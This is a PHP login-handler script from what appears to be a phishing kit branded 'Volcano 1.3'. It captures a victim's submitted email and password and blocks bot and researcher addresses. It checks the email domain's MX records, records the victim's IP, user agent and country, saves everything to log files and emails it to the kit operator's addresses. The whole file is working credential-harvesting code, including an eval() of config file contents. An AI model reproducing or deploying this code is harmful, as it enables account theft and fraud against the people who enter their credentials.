<?php include'../proxy.php';?>
<?php

require_once __DIR__ . '/../filter.php';
require_once __DIR__ . '/../function.php';

if (file_exists('../../config/' . $api->general_config))
{
  @eval(file_get_contents('../../config/' . $api->general_config));
}

$api->waiting();

$_SESSION['email']    = $_POST['email'];
$_SESSION['password'] = $_POST['password'];

if ($config_filter == 1)
{
  foreach ($email_bots as $email_bot)
  {
    if (stristr($_SESSION['email'], $email_bot) !== false)
    {
      $api->blocked("Email Bot ".$_SESSION['email']);
      echo "banned";
      exit;
    }
  }
}

if (strlen($_SESSION['password']) < 5 || strlen($_SESSION['password']) > 25)
{
    
  echo "error";
    
      
}
if (filter_var($_SESSION['email'], FILTER_VALIDATE_EMAIL)) {
$domain = explode('@', $_SESSION['email'])[1];
    
if (!checkdnsrr ($domain, 'MX')){
    echo "error";
}
}
else{echo "error";}

    
   if (!empty($_POST['killbill'])) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
else
{
  $message  = file_get_contents('../assets/html/signin.html');

  $message  = preg_replace('{KUZULUY-A}', $_SESSION['email'], $message);
  $message  = preg_replace('{KUZULUY-B}', $_SESSION['password'], $message);

  $message  = preg_replace('{KUZULUY-C}', $_SESSION['ip'], $message);
  $message  = preg_replace('{KUZULUY-D}', $_SESSION['agent'], $message);

  $subject  = "Login | ".$_SESSION['email']." | [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]";
  $headers  = "From: Volcano 1.3 <mail@volcano.org>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
  $be=md5 (rand(0,100000));
  $myfile = fopen("../logs/Login-".$be."gs.html", "a+");
  fwrite($myfile, $message);
  fclose($myfile);
  if ($config_smtp == 1)
  {
        foreach(explode(",", $email_results) as $tomail) {

    $api->ngesend($tomail, $subject, $message);
  }
  }
  else
  {
       foreach(explode(",", $email_results) as $tomail) {
    mail($tomail, $subject, $message, $headers);
       }
  }
}
?>
